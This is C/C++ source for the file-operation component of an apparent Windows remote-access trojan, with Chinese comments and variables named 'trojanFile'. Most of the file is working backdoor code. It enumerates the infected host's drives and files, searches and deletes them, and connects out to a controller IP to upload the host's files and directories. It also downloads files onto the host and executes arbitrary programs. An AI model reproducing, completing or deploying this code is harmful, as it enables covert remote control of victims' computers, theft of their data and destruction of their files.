#include <winsock2.h>
#include <Windows.h>
#include <shellapi.h>
#include <process.h>
#include <time.h>

#include "fileOperation.h"
#include "conn.h"
#include "svrdll.h"
#include "macro.h"

/*
class HelpFileOpClass
{
public:
	DECLARE_DLLINFO_MAP()
};

BEGIN_DLLINFO_MAP(HelpFileOpClass)
	ADD_DLLINFO_ENTRY(CONTROL_ENUM_DISKS, 0, "EnumAllDrives")
	ADD_DLLINFO_ENTRY(CONTROL_ENUM_FILES, 0, "EnumDir")
	ADD_DLLINFO_ENTRY(CONTROL_CREATE_DIR, 0, "CreateDir")
	ADD_DLLINFO_ENTRY(CONTROL_DELETE_FILE, 0, "DeleteFileOrDir")
	ADD_DLLINFO_ENTRY(CONTROL_RENAME_FILE, 0, "RenameFileOrDir")
	ADD_DLLINFO_ENTRY(CONTROL_UPLOAD_FILE, 0, "UploadFileOrDir")
	ADD_DLLINFO_ENTRY(CONTROL_DOWNLOAD_FILE, 0, "DownloadFileOrDir")
	ADD_DLLINFO_ENTRY(CONTROL_COPY_FILE, 0, "CopyFileOrDir")
	ADD_DLLINFO_ENTRY(CONTROL_RUN_FILE, 0, "ExecFile")
	ADD_DLLINFO_ENTRY(CONTROL_SEARCH_FILE, 0, "SearchFile")

END_DLLINFO_MAP()

int GetDllFuncCnt(){return HelpFileOpClass::GetInfoCnt();}

const dll_info* GetDllFuncs(){return HelpFileOpClass::GetInfos();}
*/

static char ip[16];
static int conn_port;
static int conn_type;

int OnInitialize(void *p)
{
	union client_cfg* cfg= (union client_cfg*)p;
	
	strcpy(ip, cfg->cfg1.clientIP);
	conn_port = cfg->cfg1.port;
	conn_type = cfg->cfg1.conn_type;

	return 0;
}


//分离一个完整文件从而获得路径和文件名
static int DetachPathAndFile(char* fullName, char* path, char* name)
{
	int n = strlen(fullName);
	int nLen = n;
	if(fullName[nLen-1] == '\\')//如果本身是目录且最后带"\\"则去除之
	{
		nLen--;
		n--;
	}

	for(; nLen >= 1; nLen--)//寻找此目录或文件所在的父目录
	{
		if(fullName[nLen-1] == '\\')
		{
			break;
		}
	}
	if(nLen == 0)	return -1;

	strncpy(path, fullName, nLen-1);
	path[nLen-1] = 0;
	strncpy(name, fullName+nLen, n-nLen);
	name[n-nLen] = 0;
	return 0;
}


/************************************************************************/
/* 获取系统所有驱动器                                                   */
/************************************************************************/
int EnumAllDrives(conn s, char* buf, int n, writeToClient fn)
{
	control_header header = INITIALIZE_ENCYRPT_HEADER(CONTROL_ENUM_DISKS);
	//control_header header = INITIALIZE_HEADER(CONTROL_ENUM_DISKS);
	int nStatus = 0;

	const int maxDrives = 26;
	int nDrives = 0;
	struct partition_info drives[maxDrives];
	memset(&drives, 0, sizeof(drives));
	char* p = NULL;
	char driveStr[MAX_PATH] = {0};
	int len ;

	len = GetLogicalDriveStringsA(sizeof(driveStr), driveStr);
	if(len < 0)	
	{
		KDebug("GetLogicalDriveStringsA error %d", GetLastError());
		nStatus = ERR_FAILGETDISK;
		goto leave;
	}

	p = driveStr;
	while(*p)
	{
		strncpy(drives[nDrives].name, p, 2);
		
		//驱动器类型
		switch(GetDriveTypeA(p))
		{
		case DRIVE_UNKNOWN:
			drives[nDrives].driveType = IS_UNKNOW;	break;
		case DRIVE_REMOVABLE:
			drives[nDrives].driveType = IS_REMOVABLE;break;
		case DRIVE_FIXED:
			drives[nDrives].driveType = IS_FIXED;	break;
		case DRIVE_REMOTE:
			drives[nDrives].driveType = IS_REMOTE;	break;
		case DRIVE_CDROM:
			drives[nDrives].driveType = IS_CDROM;	break;
		case DRIVE_RAMDISK:
			drives[nDrives].driveType = IS_RAM;		break;
		default:
			drives[nDrives].driveType = IS_UNKNOW;	break;
		}
		
		//驱动器大小
		ULARGE_INTEGER size[3];
		if(GetDiskFreeSpaceExA(p, &size[0], &size[1], &size[2]))
		{
			drives[nDrives].highTotalBytes = size[1].HighPart;
			drives[nDrives].lowTotalBytes = size[1].LowPart;
			drives[nDrives].highFreeBytes = size[2].HighPart;
			drives[nDrives].lowFreeBytes = size[2].LowPart;
		}

		nDrives++;
		p += (strlen(p) + 1);
	}

	header.dataLen = nDrives * sizeof(struct partition_info);
	if(fn)
	{
		int n;
		
		n = fn(s, &header, (const char*)&drives[0], header.dataLen);
		if(n <= 0)	fprintf(stderr, "error because of %d\n", conn_error);
		else printf("write %d bytes data\n", n);
	}
	return 0;


leave:
	header.response = nStatus;
	if(fn)	fn(s, &header, NULL, 0);
	return nStatus;
}

/************************************************************************/
/* 获取目录结构                                                          */
/************************************************************************/
int EnumDir(conn s, char* buf, int n, writeToClient fn)
{
	control_header header = INITIALIZE_ENCYRPT_HEADER(CONTROL_ENUM_FILES);
	//control_header header = INITIALIZE_HEADER(CONTROL_ENUM_FILES);
	int nStatus = 0;

	if(buf == NULL || n == 0)
	{
		nStatus = ERR_INVPARA;
		goto leave;
	}
	fileop_info* info = (fileop_info*)buf;
	char* dir = info->fileName;	
	const int MAX_PACKAGES = 4;
	struct dir_info dirs[MAX_PACKAGES];	
	int nContent = 0, nSeq = 0;
	WIN32_FIND_DATAA wfd;
	HANDLE h;
	char pattern[MAX_PATH];
	sprintf(pattern, "%s\\*.*", dir);
	if( (h = FindFirstFileA(pattern, &wfd)) == INVALID_HANDLE_VALUE)
    {
		KDebug("FindFirstFileA error %d", GetLastError());
		nStatus = ERR_NOTFIND;
		goto leave;
    }
    
	//遍历该目录
	do
    {
        if (!strcmp(wfd.cFileName, ".") || !strcmp(wfd.cFileName, ".."))
            continue;
        
		//获取文件或者目录的属性
		strncpy(dirs[nContent].name, wfd.cFileName, sizeof(dirs[nContent].name));
		if(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			dirs[nContent].fileType = IS_DIR;
		else
			dirs[nContent].fileType = IS_FILE;
		dirs[nContent].fileSizeHigh = wfd.nFileSizeHigh;
		dirs[nContent].fileSizeLow = wfd.nFileSizeLow;
		dirs[nContent].highDateTime = wfd.ftLastWriteTime.dwHighDateTime;
		dirs[nContent].lowDateTime = wfd.ftLastWriteTime.dwLowDateTime;			

		//如果超出一次发送的极限
		nContent++;
		if(nContent == MAX_PACKAGES)
		{
			header.seq++;
			header.dataLen = nContent*sizeof(struct dir_info);
			if(fn)
			{
				fn(s, &header, (const char*)&dirs[0], header.dataLen);
			}
			nContent = 0;
		}
    }while (FindNextFileA(h, &wfd));
    FindClose(h);

	//尚且残余一部分数据
	if(nContent != MAX_PACKAGES)
	{
		header.seq++;
		header.dataLen = nContent*sizeof(struct dir_info);
		if(fn)
		{
			fn(s, &header, (const char*)&dirs[0], header.dataLen);
		}
	}

	//告诉客户端数据发送结束
	header.dataLen = -1;
	if(fn)	fn(s, &header, NULL, -1);

	return 0;

leave:
	header.response = nStatus;
	if(fn)	fn(s, &header, NULL, 0);
	return nStatus;
}

/************************************************************************/
/* 创建目录                                                              */
/************************************************************************/
int CreateDir(conn s, char* buf, int n, writeToClient fn)
{
	control_header header = INITIALIZE_HEADER(CONTROL_CREATE_DIR);
	int nStatus = 0;

	if(buf == NULL || n == 0)
	{
		nStatus = ERR_INVPARA;
		goto leave;
	}

	fileop_info* info = (fileop_info*)buf;
	char* dir = info->fileName;
	if(CreateDirectoryA(buf, NULL) == TRUE)
	{
		if(fn)	fn(s, &header, NULL, 0);
		return 0;
	}
	else	
	{
		int err = GetLastError();
		KDebug("CreateDir %s error %d\n", dir, err);
		if(err == ERROR_ACCESS_DENIED)
			nStatus = ERR_DENIED;
		else if(err == ERROR_ALREADY_EXISTS)
			nStatus = ERR_EXIST;
		else if(err == ERROR_PATH_NOT_FOUND)
			nStatus = ERR_NOPATH;
		else nStatus = ERR_UNKNOWN;
	}

leave:
	header.response = nStatus;
	if(fn)	fn(s, &header, NULL, 0);
	return nStatus;
}

/************************************************************************/
/* 重命名文件或者目录                                                   */
/************************************************************************/
int RenameFileOrDir(conn s, char* buf, int n, writeToClient fn)
{
	control_header header = INITIALIZE_HEADER(CONTROL_RENAME_FILE);
	int nStatus = 0;
	
	if(buf == NULL || n == 0)
	{
		nStatus = ERR_INVPARA;
		goto leave;
	}

	fileop_info* info = (fileop_info*)buf;
	char* oldFile = info->renameInfo.oldFile;
	char* newFile = info->renameInfo.newFile;

	if(MoveFileA(oldFile, newFile) == TRUE)
	{
		if(fn)	fn(s, &header, NULL, 0);
		return 0;
	}
	else	
	{
		int err = GetLastError();
		KDebug("Rename %s error %d\n", oldFile, err);
		if(err == ERROR_ACCESS_DENIED)
			nStatus = ERR_DENIED;
		else nStatus = ERR_UNKNOWN;
	}


leave:
	header.response = nStatus;
	if(fn)	fn(s, &header, NULL, 0);
	return nStatus;
}

/************************************************************************/
/* 删除文件或者目录                                                      */
/************************************************************************/

static int MyDeleteFile(const char* fileName)
{
	if(SetFileAttributesA(fileName, FILE_ATTRIBUTE_NORMAL) == FALSE || DeleteFileA(fileName) == FALSE)
	{
		int err = GetLastError();
		KDebug("Delete %s error %d\n", fileName, err);
		if(err == ERROR_ACCESS_DENIED)
			return ERR_DENIED;
		return ERR_UNKNOWN;
	}
	return 0;
}

static int MyDeleteDir(const char* dirName)
{
	WIN32_FIND_DATAA wfd;
	HANDLE h;
	char pattern[MAX_PATH];
	sprintf(pattern, "%s\\*.*", dirName);
	if( (h = FindFirstFileA(pattern, &wfd)) == INVALID_HANDLE_VALUE)
	{
		if(ERROR_NO_MORE_FILES != GetLastError())
			return ERR_NOTFIND;
	}
	
	//递归删除子目录和文件
	do{
		if (!strcmp(wfd.cFileName, ".") || !strcmp(wfd.cFileName, ".."))
			continue;

		if(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			char newDir[MAX_PATH];
			sprintf(newDir, "%s\\%s", dirName, wfd.cFileName);
			MyDeleteDir(newDir);
		}
		else
		{
			char newFile[MAX_PATH];
			sprintf(newFile, "%s\\%s", dirName, wfd.cFileName);
			MyDeleteFile(newFile);
		}
	}while(FindNextFileA(h, &wfd));

	FindClose(h);

	//目录中不再含有任何文件，所以只需简单删除目录
	if(SetFileAttributesA(dirName, FILE_ATTRIBUTE_DIRECTORY) == FALSE || RemoveDirectoryA(dirName) == FALSE)
	{
		int err = GetLastError();
		KDebug("RemoveDirectoryA %s error %d\n", dirName, err);
		if(err == ERROR_ACCESS_DENIED)
			return ERR_DENIED;
		return ERR_UNKNOWN;	
	}

	return 0;
}

int DeleteFileOrDir(conn s, char* buf, int n, writeToClient fn)
{
	control_header header = INITIALIZE_HEADER(CONTROL_DELETE_FILE);
	int nStatus = 0;

	if(buf == NULL || n == 0)
	{
		nStatus = ERR_INVPARA;
		goto leave;
	}

	fileop_info* info = (fileop_info*)buf;
	char * fileName = info->fileName;

	unsigned long attr = GetFileAttributesA(fileName);
	if(attr == -1)//文件或者目录不存在
	{
		nStatus = ERR_NOTFIND;
		goto leave;
	}
	else if( attr & FILE_ATTRIBUTE_DIRECTORY)
		nStatus = MyDeleteDir(fileName);
	else 
		nStatus = MyDeleteFile(fileName);
	
	if(nStatus != 0)
		goto leave;

	if(fn)	fn(s, &header, NULL, 0);
	return 0;

leave:
	header.response = nStatus;
	if(fn)	fn(s, &header, NULL, 0);
	return nStatus;
}

/************************************************************************/
/* 拷贝文件或者目录                                                     */
/************************************************************************/
static int MyCopyFile(const char* oldfile, const char* newfile)
{
	if(CopyFileA(oldfile, newfile, FALSE) == FALSE)
		return GetLastError();
	return 0;
}

static int MyCopyDir(const char* oldDir, const char* newDir)
{
	//首先创建新的目录
	if(CreateDirectoryA(newDir, NULL) == FALSE)
	{
		if(ERROR_ALREADY_EXISTS != GetLastError())
			return ERR_NOPATH;
	}
	
	WIN32_FIND_DATAA wfd;
	HANDLE h;
	char pattern[MAX_PATH];
	sprintf(pattern, "%s\\*.*", oldDir);
	if( (h = FindFirstFileA(pattern, &wfd)) == INVALID_HANDLE_VALUE)
		return ERR_NOTFIND;

	//递归拷贝子目录和文件
	do{
		if (!strcmp(wfd.cFileName, ".") || !strcmp(wfd.cFileName, ".."))
			continue;

		if(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			char oldSubDir[MAX_PATH], newSubDir[MAX_PATH];
			sprintf(oldSubDir, "%s\\%s", oldDir, wfd.cFileName);
			sprintf(newSubDir, "%s\\%s", newDir, wfd.cFileName);
			MyCopyDir(oldSubDir, newSubDir);
		}
		else
		{
			char oldSubFile[MAX_PATH], newSubFile[MAX_PATH];
			sprintf(oldSubFile, "%s\\%s", oldDir, wfd.cFileName);
			sprintf(newSubFile, "%s\\%s", newDir, wfd.cFileName);
			MyCopyFile(oldSubFile, newSubFile);
		}
	}while(FindNextFileA(h, &wfd));

	FindClose(h);

	return 0;
}

int CopyFileOrDir(conn s, char* buf, int n, writeToClient fn)
{
	control_header header = INITIALIZE_HEADER(CONTROL_COPY_FILE);
	int nStatus = 0;

	if(buf == NULL || n == 0)
	{
		nStatus = ERR_INVPARA;
		goto leave;
	}

	fileop_info* info = (fileop_info*)buf;
	char * oldfile = info->copyInfo.oldFile;
	char * newfile = info->copyInfo.newFile;

	unsigned long attr = GetFileAttributesA(oldfile);
	if(attr == -1)//文件或者目录不存在
	{
		nStatus = ERR_NOTFIND;
		goto leave;
	}
	else if( attr & FILE_ATTRIBUTE_DIRECTORY)
		nStatus = MyCopyDir(oldfile, newfile);
	else
		nStatus = MyCopyFile(oldfile, newfile);
	
	if(nStatus != 0)
		goto leave;

	if(fn)	fn(s, &header, NULL, 0);
	return 0;

leave:
	header.response = nStatus;
	if(fn)	fn(s, &header, NULL, 0);
	return nStatus;
}

struct ftpStruct{
	fileop_info info;
};


/************************************************************************/
/* 监控客户端上传文件到本地，监控客户端 --->  本地                      */
/************************************************************************/
static unsigned __stdcall uploadThread(void* p)
{
	struct ftpStruct* param = (struct ftpStruct*)p;
	int nStatus = 0;
	
	KDebug("Step1: upload %s <--> %s\n", param->info.ftpInfo.clientFile, param->info.ftpInfo.trojanFile);
	SetEvent(param->info.ftpInfo.event);
	
	conn ftpfd = conn_socket(conn_type);
	if(ftpfd == NULL)	return ERR_FAILCONN;

	struct sockaddr_in servaddr;
	servaddr.sin_port = conn_htons(conn_port);
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = conn_inet_addr(ip);

	//连接监控机器
	KDebug("Ask %s [%d, %d] for file upload request", ip, conn_type, conn_port);
	if(conn_connect(ftpfd, (const sockaddr*)&servaddr, sizeof(servaddr)) < 0)
		return ERR_FAILCONN;
	
	//立马发送一个标记，提醒注意这是一个文件请求
	unsigned char task = 'F';
	control_header feedBack;
	conn_write(ftpfd, (char*)&task, sizeof(task), 0);
	conn_read(ftpfd, (char*)&feedBack, sizeof(feedBack), 0); 

	//继续提醒这是一个文件上传请求，传送开始
	{
		control_header header = INITIALIZE_HEADER(CONTROL_UPLOAD_FILE);
		conn_write(ftpfd, (const char*)&header, sizeof(header), 0);
		conn_write(ftpfd, (const char*)&param->info, sizeof(param->info), 0);
	}

	//本地需要相应设置目录
	char* thisDir = param->info.ftpInfo.trojanFile;
	char rootDirWithLastPrefix[256];
	sprintf(rootDirWithLastPrefix, "%s\\", thisDir);
	SetCurrentDirectoryA(rootDirWithLastPrefix);
	
	control_header header;
	int nRead = 0, r = 0;
	while(1)
	{
		nRead = conn_read(ftpfd, (char*)&header, sizeof(header), 0);
		if(nRead < 0)
		{
			nStatus = conn_error; 
			goto leave; 
		}

		switch(header.command)
		{
		case CONTROL_CREATE_DIR:
		{
			//KDebug("recv CONTROL_CREATE_DIR");
			dir_info info;
			if(conn_read(ftpfd, (char*)&info, sizeof(info), 0))
				CreateDirectoryA(info.name, NULL);
			break;
		}
		case CONTROL_INFO_FILE:
		{
			//KDebug("recv CONTROL_INFO_FILE");
			dir_info info;
			if(conn_read(ftpfd, (char*)&info, sizeof(info), 0))
			{
				__int64 fileSize = ((__int64)info.fileSizeHigh << 32) + info.fileSizeLow;
				__int64 allSize = 0;
				char buf[1024];
				int readOnce = sizeof(buf);
				HANDLE fd = CreateFileA(info.name, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, 
					CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

				//KDebug("creating file %s with size %lld bytes\n", info.name, fileSize);
				while(allSize < fileSize)
				{
					if((fileSize - allSize) < readOnce)	
						readOnce = fileSize - allSize; 
					nRead = conn_read(ftpfd, buf, readOnce, 0);
					if(nRead <= 0)
					{
						nStatus = conn_error; 
						//KDebug("read error since %d, has read %lld bytes\n", nStatus, allSize);
						if(fd != INVALID_HANDLE_VALUE) CloseHandle(fd);
						goto leave;
					}
					allSize += nRead;
					//if(allSize % (1024*1024) == 0 || allSize == fileSize)
					//	KDebug("receive file size of %lld bytes\n", allSize);

					int write_count;
					if(fd != INVALID_HANDLE_VALUE)
						WriteFile(fd, buf, nRead, (LPDWORD)&write_count, NULL);
				}
				if(fd != INVALID_HANDLE_VALUE) CloseHandle(fd);
			}
			//else
			//	PrintError("read CONTROL_INFO_FILE", conn_error);

			break;
		}
	case CONTROL_END_TRANSFER:
		{
			//KDebug("recv CONTROL_END_TRANSFER");
			goto leave;
		}

	default:
		//KDebug("default");
		break;
		}
	}

leave:
	REASSIGN_HEADER(header, CONTROL_END_TRANSFER, nStatus);
	conn_write(ftpfd, (const char*)&header, sizeof(header), 0);
	
	conn_close(ftpfd);
	return NULL;
}

int UploadFileOrDir(conn s, char* buf, int n, writeToClient fn)
{
	control_header header = INITIALIZE_HEADER(CONTROL_UPLOAD_FILE);
	int nStatus = 0;
	union fileop_info* info = (union fileop_info*)buf;
	struct ftpStruct* param = new struct ftpStruct;
	memcpy(&param->info, info, sizeof(union fileop_info)); 
	
	//开启线程，下载监控客户端的文件
	//此时监控客户端扮演服务端的角色，本地机器扮演客户端的角色
	HANDLE hThread;
	unsigned threadID;

	param->info.ftpInfo.event = CreateEventA(NULL, FALSE, FALSE, NULL);
	if((hThread = (HANDLE)_beginthreadex(NULL, 0, uploadThread, param, 0, &threadID) ) == NULL)
		nStatus = ERR_FAILJOB;
	WaitForSingleObject((HANDLE)param->info.ftpInfo.event, INFINITE);
	CloseHandle((HANDLE)param->info.ftpInfo.event);
	CloseHandle(hThread);
	//KDebug("Step2: Createthread %s %s\n", info->ftpInfo.clientFile, info->ftpInfo.trojanFile);
	
	header.response = nStatus;
	if(fn)	fn(s, &header, NULL, 0);
	return nStatus;
}

//下载单个文件
static int downloadFile(conn s, const char* fileName)
{
	control_header header = INITIALIZE_HEADER(CONTROL_INFO_FILE);
	dir_info fileinfo;
	//KDebug("Processing %s\n", fileName);

	HANDLE fd = CreateFileA(fileName, GENERIC_READ,FILE_SHARE_READ, NULL,
							OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(fd == INVALID_HANDLE_VALUE)	
	{
		//KDebug("In %s CreateFileA: %d\n", __FUNCTION__, GetLastError());
		return GetLastError();
	}

	LARGE_INTEGER size = { 0,0 };
	if(GetFileSizeEx(fd, &size) == 0)
	{
		//KDebug("In %s GetFileSizeEx: %d\n", __FUNCTION__, GetLastError());
		return GetLastError();
	}

	memset(&fileinfo, 0, sizeof(fileinfo));
	fileinfo.fileSizeHigh = size.HighPart;
	fileinfo.fileSizeLow = size.LowPart;
	strcpy(fileinfo.name, fileName);
	fileinfo.fileType = IS_FILE;
	header.dataLen = sizeof(fileinfo);

	//通知客户端文件大小
	conn_write(s, (const char*)&header, sizeof(header), 0);
	conn_write(s, (const char*)&fileinfo, sizeof(fileinfo), 0);

	//发送文件具体数据
	int read_count = 0;
	__int64 allSize = 0, totalSize = ((__int64)size.HighPart << 32) + size.LowPart;
	char buf[1024] = {0};
	do{
		if(ReadFile(fd, buf,sizeof(buf), (LPDWORD)&read_count, NULL) == FALSE)
		{
			int err = GetLastError();
			//KDebug("ReadFile %d", err);
			CloseHandle(fd);
			return err;
		}

		if(read_count == 0)	break;

		int writeN = conn_write(s, buf, read_count, 0);
		if(writeN < 0)	
		{
			//KDebug("write error %d, till now processed %lld bytes", conn_error, allSize);
			CloseHandle(fd); 
			return -1;
		}

		allSize += read_count;
	}while(1);
	CloseHandle(fd);

	return 0;
}

//下载整个目录
static int downloadDir(conn s, const char* dirName)
{
	control_header header = INITIALIZE_HEADER(CONTROL_CREATE_DIR);
	dir_info info;
	
	//KDebug("In %s processing %s\n", __FUNCTION__, dirName);

	memset(&info, 0, sizeof(info));
	strcpy(info.name, dirName);
	info.fileType = IS_DIR;
	header.dataLen = sizeof(info);

	//通知客户端创建目录
	conn_write(s, (const char*)&header, sizeof(header), 0);
	conn_write(s, (const char*)&info, sizeof(info), 0);

	WIN32_FIND_DATAA wfd;
	HANDLE h;
	char pattern[MAX_PATH];
	sprintf(pattern, "%s\\*.*", dirName);
	if( (h = FindFirstFileA(pattern, &wfd)) == INVALID_HANDLE_VALUE)
	{
		if(ERROR_NO_MORE_FILES != GetLastError())
			return ERR_NOTFIND;
	}

	//递归下载子目录和文件
	do{
		if (!strcmp(wfd.cFileName, ".") || !strcmp(wfd.cFileName, ".."))
			continue;

		if(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			char newDir[MAX_PATH];
			sprintf(newDir, "%s\\%s", dirName, wfd.cFileName);
			downloadDir(s, newDir);
		}
		else
		{
			char newFile[MAX_PATH];
			sprintf(newFile, "%s\\%s", dirName, wfd.cFileName);
			downloadFile(s, newFile);
			Sleep(33);
		}
	}while(FindNextFileA(h, &wfd));

	FindClose(h);

	return 0;
}

/************************************************************************/
/* 监控客户端下载本地的文件，监控客户端 <---  本地                      */
/************************************************************************/
static unsigned __stdcall downloadThread(void* p)
{
	struct ftpStruct* param = (struct ftpStruct*)p;
	int nStatus = 0;

	//KDebug("Step1: download %s --> %s\n", param->info.ftpInfo.trojanFile, param->info.ftpInfo.clientFile);
	SetEvent(param->info.ftpInfo.event);
	
	conn ftpfd = conn_socket(conn_type);
	if(ftpfd == NULL)	return ERR_FAILCONN;

	struct sockaddr_in servaddr;
	servaddr.sin_port = conn_htons(conn_port);
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = conn_inet_addr(ip);

	//连接监控机器
	//KDebug("Ask %s [%d, %d] for file download request", ip, conn_type, conn_port);
	if(conn_connect(ftpfd, (const sockaddr*)&servaddr, sizeof(servaddr)) < 0)
		return ERR_FAILCONN;
	
	//立马发送一个标记，提醒注意这是一个文件传送请求
	unsigned char task = 'F';
	control_header feedBack;
	conn_write(ftpfd, (char*)&task, sizeof(task), 0);
	conn_read(ftpfd, (char*)&feedBack, sizeof(feedBack), 0); 

	//继续提醒这是一个文件下载请求，传送开始
	{
		control_header header = INITIALIZE_HEADER(CONTROL_DOWNLOAD_FILE);
		conn_write(ftpfd, (const char*)&header, sizeof(header), 0);
		conn_write(ftpfd, (const char*)&param->info, sizeof(param->info), 0);
	}

	control_header header;
	char* thisFileOrDir = param->info.ftpInfo.trojanFile;
	unsigned long attr = GetFileAttributesA(thisFileOrDir);
	if(attr == -1)//文件或者目录不存在
	{
		nStatus = ERR_NOTFIND;
		goto leave;
	}

	char thisParentDir[256], fileOrDirWithoutPath[256];
	nStatus = DetachPathAndFile(thisFileOrDir, thisParentDir, fileOrDirWithoutPath);
	if(nStatus != 0)	goto leave;

	char rootDirWithLastPrefix[256];
	sprintf(rootDirWithLastPrefix, "%s\\", thisParentDir);
	SetCurrentDirectoryA(rootDirWithLastPrefix);

	if( attr & FILE_ATTRIBUTE_DIRECTORY)
		nStatus = downloadDir(ftpfd, fileOrDirWithoutPath);
	else
		nStatus = downloadFile(ftpfd, fileOrDirWithoutPath);

leave:
	REASSIGN_HEADER(header, CONTROL_END_TRANSFER, nStatus);
	conn_write(ftpfd, (const char*)&header, sizeof(header), 0);

	conn_close(ftpfd);
	return nStatus;
}

int DownloadFileOrDir(conn s, char* buf, int n, writeToClient fn)
{
	control_header header = INITIALIZE_HEADER(CONTROL_DOWNLOAD_FILE);
	int nStatus = 0;

	union fileop_info* info = (union fileop_info*)buf;
	struct ftpStruct* param = new struct ftpStruct;
	memcpy(&param->info,info, sizeof(union fileop_info)); 

	//开启线程，上传文件到监控客户端
	//此时监控客户端扮演服务端的角色，本地机器扮演客户端的角色
	param->info.ftpInfo.event = CreateEventA(NULL, FALSE, FALSE, NULL);
	HANDLE hThread;
	unsigned threadID;
	if((hThread = (HANDLE)_beginthreadex(NULL, 0, downloadThread, param, 0, &threadID) ) == NULL)
		nStatus = ERR_FAILJOB;
	WaitForSingleObject((HANDLE)param->info.ftpInfo.event, INFINITE);
	CloseHandle((HANDLE)param->info.ftpInfo.event);
	CloseHandle(hThread);
	//KDebug("Step2: Createthread %s %s\n", info->ftpInfo.clientFile, info->ftpInfo.trojanFile);

	header.response = nStatus;
	if(fn)	fn(s, &header, NULL, 0);
	return nStatus;
}

static int MyFindFile(conn s, const char* dir, const char* findpat, writeToClient fn,
					  control_header& header, int &nContent, int& nSeq, 
					 struct dir_info dirs[], int MAX_PACKAGES)
{
	WIN32_FIND_DATAA wfd;
	HANDLE h;
	char pattern[MAX_PATH];
	int find;
	int nStatus = 0;

	sprintf(pattern, "%s\\*.*", dir);
	if( (h = FindFirstFileA(pattern, &wfd)) == INVALID_HANDLE_VALUE)
		return ERR_NOTFIND;

	//遍历该目录
	do
	{
		char fileName[260];
		strcpy(fileName, wfd.cFileName);
		_strlwr_s(fileName);

		if (!strcmp(fileName, ".") || !strcmp(fileName, ".."))
			continue;

		int isdir = wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY;
		find = 0;
		if(strcmp(findpat, "*") == 0 || strcmp(findpat, "*.*") == 0)
			find = 1;
		else if(strncmp(findpat, "*", 1) == 0 && strstr(fileName, findpat+1))
			find = 1;
		else if(strstr(fileName, findpat))
			find = 1;
		
		if(find == 1)
		{
			sprintf(dirs[nContent].name, "%s\\%s", dir, wfd.cFileName);
			dirs[nContent].fileType = isdir ? IS_DIR : IS_FILE;
			dirs[nContent].fileSizeHigh = wfd.nFileSizeHigh;
			dirs[nContent].fileSizeLow = wfd.nFileSizeLow;
			dirs[nContent].highDateTime = wfd.ftLastWriteTime.dwHighDateTime;
			dirs[nContent].lowDateTime = wfd.ftLastWriteTime.dwLowDateTime;			

			//如果超出一次发送的极限
			nContent++;
			if(nContent == MAX_PACKAGES)
			{
				header.seq++;
				header.dataLen = nContent*sizeof(struct dir_info);
				if(fn)
				{
					fn(s, &header, (const char*)&dirs[0], header.dataLen);
				}
				nContent = 0;
			}
		}

		if(isdir)
		{
			char newDir[MAX_PATH];
			sprintf(newDir, "%s\\%s", dir, wfd.cFileName);
			MyFindFile(s, newDir, findpat, fn, header, nContent, nSeq, dirs, MAX_PACKAGES);
		}

	}while (FindNextFileA(h, &wfd));
	FindClose(h);
	
	return 0;
}

int SearchFile(conn s, char* buf, int n, writeToClient fn)
{
	control_header header = INITIALIZE_ENCYRPT_HEADER(CONTROL_SEARCH_FILE);
	//control_header header = INITIALIZE_HEADER(CONTROL_SEARCH_FILE);
	int nStatus = 0;
	union fileop_info* info = (union fileop_info*)buf;
	char* dir = info->searchInfo.dir;	
	_strlwr_s(info->searchInfo.pattern);
	char* findpattern = info->searchInfo.pattern;
	const int MAX_PACKAGES = 4;
	struct dir_info dirs[MAX_PACKAGES];	
	int nContent = 0, nSeq = 0;
	
	nStatus = MyFindFile(s, dir, findpattern, fn, header, nContent, nSeq, dirs, MAX_PACKAGES);
	
	//尚且残余一部分数据
	if(nContent && nContent != MAX_PACKAGES)
	{
		header.seq++;
		header.dataLen = nContent*sizeof(struct dir_info);
		if(fn)
		{
			fn(s, &header, (const char*)&dirs[0], header.dataLen);
		}
	}

	//告诉客户端数据发送结束
	header.dataLen = -1;
	if(fn)	fn(s, &header, NULL, -1);

	return 0;
}

int ExecFile(conn s, char* buf, int n, writeToClient fn)
{
	control_header header = INITIALIZE_HEADER(CONTROL_RUN_FILE);
	int nStatus = 0;
	union fileop_info* info = (union fileop_info*)buf;
	const char* fileName = info->fileName;
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	if(!CreateProcessA(fileName, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
	{
		nStatus = GetLastError();
		//KDebug("CreateProcessA %d", nStatus);
	}

	header.response = nStatus;
	if(fn)	fn(s, &header, NULL, 0);
	return nStatus;
}